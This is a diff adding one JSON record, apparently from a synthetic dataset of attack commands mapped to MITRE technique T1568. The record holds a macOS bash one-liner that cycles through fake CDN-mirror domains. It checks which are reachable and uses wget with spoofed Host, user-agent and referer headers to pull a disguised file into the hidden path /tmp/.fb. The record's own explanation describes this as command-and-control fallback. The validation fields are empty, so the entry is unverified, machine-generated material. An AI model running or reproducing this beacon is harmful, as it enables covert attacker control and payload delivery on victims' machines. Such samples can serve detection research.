@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; for d in cdn-github-mirror.net cdn-dropbox-mirror.net cdn-notion-mirror.net; do ip=$(dig +short A \"$d\" | head -1); if [ -n \"$ip\" ]; then nc -z -G 3 \"$ip\" 80 >/dev/null 2>&1 && wget -q --header=\"Host: $d\" --user-agent=\"$ua\" --referer=\"https://$d/\" --timeout=8 --tries=1 \"http://$ip/favicon.ico\" -O /tmp/.fb && break; fi; sleep $((1+RANDOM%3)); done",
+  "explanation": "Uses a runtime-checked fallback list of CDN-like domains. Each candidate is resolved, TCP-checked, then contacted over HTTP with realistic headers, providing persistence if primary C2 fails.",
+  "rationale_steps": [
+    "Iterate over fallback domains and resolve each to an IP.",
+    "Perform TCP reachability test to port 80 before contacting.",
+    "Fetch a common web asset with Host header and referer to appear benign."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-846156da",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
